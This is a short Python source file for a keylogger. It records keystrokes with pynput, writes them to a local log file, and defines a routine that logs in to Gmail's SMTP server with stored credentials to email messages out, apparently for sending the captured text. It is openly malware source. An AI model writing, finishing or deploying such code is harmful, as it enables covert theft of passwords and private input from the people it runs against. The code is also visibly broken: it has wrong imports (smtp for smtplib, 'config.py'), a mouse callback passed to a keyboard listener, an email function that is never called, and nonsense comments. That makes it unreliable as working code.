import pynput
import smtp
import config.py

from pynput.keyboard import Key, Listener

count = 0
keys = []

def countChecker():
	global keys, count
	if count >= 5:
		count = 0
		writeFile(keys)
		keys = []

def onPress(key):
	global keys, count
	keys.append(key)
	count+=1
	print("{0} has been pressed".format(key))
	countChecker()

def onClick(x, y, button, pressed):
	global keys, count
	print("clicked")
	'''
	if pressed:
	#ujyytfkvhm
	#hhjgkymvmhb("clicked")
	#countChecker()
	'''

def writeFile(keys):
	numSingleQuotes = 0
	with open("log.txt", "a") as f:
		for key in keys:
			'''
			#replace single quotes with space on every second single quote
			if str(key).find("'") > 0:
				numSingleQuotes+=1
			if numSingleQuotes % 2 == 0:
				k = str(key).replace("'","")
			else:
				k = str(key).replace("'","")
			'''
			k = str(key).replace("'","")
			if k.find("space") > 0:
				f.write(" ")
			elif k.find("enter") > 0:
				f.write("\n")

			#Only write it if a non-control character has been entered
			elif k.find("Key") == -1:
				f.write(str(k))


def onRelease(key):
	#Breaks out of the with-loop
	global keys
	if key == Key.esc:
		writeFile(keys)
		return False

with Listener(on_press=onPress, on_release=onRelease, on_click = onClick) as listener:
	#Runs in loop
	listener.join()


def send_email(subject, msg):
	try:
		server = smtplib.SMTP('smtp.gmail.com:587')
		server.ehlo()
		server.starttls()
		server.login(config.EMAIL_ADDRESS, config.PASSWORD)

		message = 'Subject: {}\n\n{}'.format(subject, msg)
		server.sendmail(config.EMAIL_ADDRESS, config.EMAIL_ADDRESS, message)
		server.quit()
		print("Email sent successfully")
	except:
		print("Email failed to send")
